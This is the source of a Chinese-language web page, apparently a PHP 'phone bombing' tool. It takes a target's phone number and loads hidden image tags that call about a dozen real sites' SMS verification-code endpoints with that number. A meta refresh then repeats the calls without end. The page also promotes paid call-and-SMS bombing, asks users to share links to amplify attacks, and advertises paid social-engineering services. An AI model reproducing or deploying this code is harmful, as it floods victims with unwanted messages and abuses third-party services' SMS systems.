<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0”> 
<link href="fontawesome/css/font-awesome.min.css" rel="stylesheet">
<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<link rel="stylesheet" href="http://dx.postqq.com/css.css"/>
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>在线手机轰炸工具</title>
</head>
<body> 
<div class="container">

<div class="panel panel-default">
    <div class="panel-heading">
       <class="panel-title"><h3>在线手机轰炸工具 Demo <span class="label label-success" style="float: right;" onclick="window.open('http://postqq.com', '_new')"><strong>企鹅云</strong></span></h3>
    </div>
	
    <div class="input-group has-warning">
        <span class="input-group-addon input-lg">+86</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
	
	<div class="span7 text-center"><b></b></a> </div>
		<div class="span7 text-center"><div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止线程</button>
        <button type="button" class="btn btn-warning" target="_blank" onclick="top.location='http://dx.postqq.com/99'">线程X99</button>
		<button type="button" class="btn btn-primary" target="_blank" onclick="top.location='http://ww4.sinaimg.cn/large/0060lm7Tgw1f60qzopv7yj308c08cmz0.jpg'">付费服务</button>
		</div></br></div>
		</form>
<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a;
$d=$_GET['hm'];
?>
<div class="tip">
<?php
$i=13;//想要屏蔽的手机号
if($i==$d){
   echo "<br><br><H4>本手机号禁止发送垃圾短信</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>短信轰炸已启动,  对<strong>$d</strong>,已经发起<strong>$e</strong>波短信轰炸,请静静的等待几秒钟查看效果</div></div>";
    echo "<div style='display:none'>
<img src='https://kh.cfzq.com/ajaxregister!getValidationCode.action?rnd=1455187840508&mphone=$d' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$d' alt=''/>
<img src='http://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?qianwangWebMonitor=&type=qb&username=$d' alt=''/>
<img src='http://ershou.paipai.com/user/getVerifyCode?t=1454143841&sig=&callback=sendVerifyCodeCallBack&_=1454143841&mobile=$d' alt=''/>
<img src='http://open.leju.com/game/member/sendcode.html?phone=$d' alt=''/>
<img src='http://shop.sino-life.com/SL_EFS/memberRegister/sendRegistSmsCode.do?mobile=$d' alt=''/>
<img src='http://hf.tibet.cn/cr_code.php?phone_num=$d' alt=''/>
<img src='http://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?qianwangWebMonitor=&type=qb&username=$d' alt=''/>
<img src='http://pay.xiaojukeji.com/api/v2/p_getsmscode?smstype=0&source=3&openid=2088012451850013&source=alipay_wallet&channel=1300&datatype=webapp&homepage=&phone=$d' alt=''/>
<img src='http://shop.sino-life.com/SL_EFS/memberRegister/sendRegistSmsCode.do?mobile=$d' alt=''/>
<img src='http://api.9f.cn/activity/sendVerificationCode2?mobile=$d' alt=''/>
<img src='http://i.kuwo.cn/US/2014/api/send_sms.jsp?mobile=$d' alt=''/>
</div>";
     echo"<meta http-equiv=refresh content='0; url=index.php?hm=$d&amp;c=$a'>";
}

?>


<div class="bs-callout bs-callout-info bs-callout-metro">
  <h4>SHARE</h4>
<!-- Baidu Button BEGIN -->
      <div class="bdsharebuttonbox"><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享给QQ好友"></a><a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a class="bds_count" data-cmd="count"></a></div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"32"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)]; </script>

<!-- Baidu Button END -->
<p><i class="fa fa-exclamation-triangle"></i>&nbsp;<b>开始轰炸后点击分享按钮分享，你的朋友点击链接即可帮你轰炸。无需输入手机号，越多人轰炸威力越大。</b></p>
</div>

<div class="bs-callout bs-callout-warning bs-callout-metro">
<h4>付费服务</h4>
<p>
<center><h4>超乎所有你用过或者了解的轰炸方式，直达手机接收频率上限，呼叫+短信同时并发秒级响应。
<br><br>微信扫码进行预约</h4><br><img src='http://i4.piimg.com/567646/d987d970fe73a2d3.jpg'/>
</center>
</p>
</div>

<div class="bs-callout bs-callout-danger bs-callout-metro">
    <h4>SERVICE</h4>
    <p>
<button type="button" class="btn btn-block btn-success"><a href="http://iqy.postqq.com" target="_blank"><span style="color:#ffffff;">【免费】爱奇艺解析工具</span></a></button>
<button type="button" class="btn btn-block btn-primary"><a href="http://www.postqq.com/" target="_blank"><span style="color:#ffffff;">【免费】QQ相关在线辅助工具</span></a></button> 
<button type="button" class="btn btn-block btn-warning"><a href="http://igeeklab.com/" target="_blank"><span style="color:#ffffff;">【免费】Shadowsocks不限流量科学上网</span></a></button>
<button type="button" class="btn btn-block btn-danger"><a href="http://wpa.qq.com/msgrd?v=3&uin=753550313&site=qq&menu=yes" target="_blank"><span style="color:#ffffff;">【收费】社会工程学服务 隐私安全检测</span></a></button>
 </p>
</div>
<div class="bs-callout bs-callout-success bs-callout-metro">
<h4>EXPOSURE</h4>
<p><h6>骗子/无赖/流氓/人渣网络曝光中心</h6></p>
    <p>
        <!-- 多说评论框 start -->
	<div class="ds-thread" data-thread-key="index" data-title="短信轰炸工具" data-url="http://dx.postqq.com/"></div>
<!-- 多说评论框 end -->
<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"dxigeeklab"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
<!-- 多说公共JS代码 end -->
    </p>
</div>

<div class="bs-callout bs-callout-primary bs-callout-metro">
  <h4>ABOUT/API/STATISTICS/COPYRIGHT</h4></br>
  
  <h5><b>ABOUT</b></h5>
   <p>本站由：<a href="http://postqq.com/" target="_blank">企鹅云</a>提供。</br></br>我们希望打造一个由我们提供平台，技术宅们自发提供接口并且能获得我们现金奖励的大众化免费短信轰炸平台。</p></br></br>

   <h5><b>API</b></h5>
    </br>
        您可以使用下面的代码将 <a href="http://dx.postqq.com/mini">在线手机轰炸工具MINI版</a> 嵌入到您的网站中。
        <pre>&lt;script src="http://dx.postqq.com/api"&gt;&lt;/script&gt;</pre></br></br>
		
   <h5><b>COPYRIGHT</b></h5>
   <center><h6>主程序:无名<br>优化美化二次开发:企鹅云<br>服务器提供:企鹅云<br>高级轰炸服务提供:企鹅云<br>轰炸接口抓包:浆果<br>抓包工具:Fiddler <br><br>本项目已开源:<a href="http://www.9miao.com/?fromuid=602027" target="_blank">点击注册</a>后再点击<a href="http://www.9miao.com/thread-107397-1-1.html" target="_blank">下载源码</a>   版本更新日期[2016.07.18]
   <br>本站发布的源码已经在无名原版[<a href="http://i2.piimg.com/1949/5bdb4d3feec16ca7.png" target="_blank">点击查看原版截图</a>]的基础上进行了大量的重绘美化和功能完善，所以请保留源码当中的主程序作者(无名)和优化美化二次开发作者（企鹅云）相关版权信息。<br>本源码中内置了少量轰炸接口，用于大家测试，如想增强轰炸效果，那么需要自行抓包。<br></h6></center>
</br></br><h5><b>STATISTICS</b></h5>
 <p><script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1259436232'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s11.cnzz.com/z_stat.php%3Fid%3D1259436232%26online%3D1%26show%3Dline' type='text/javascript'%3E%3C/script%3E"));</script></p>
  </div>
</div>
</body>
</html>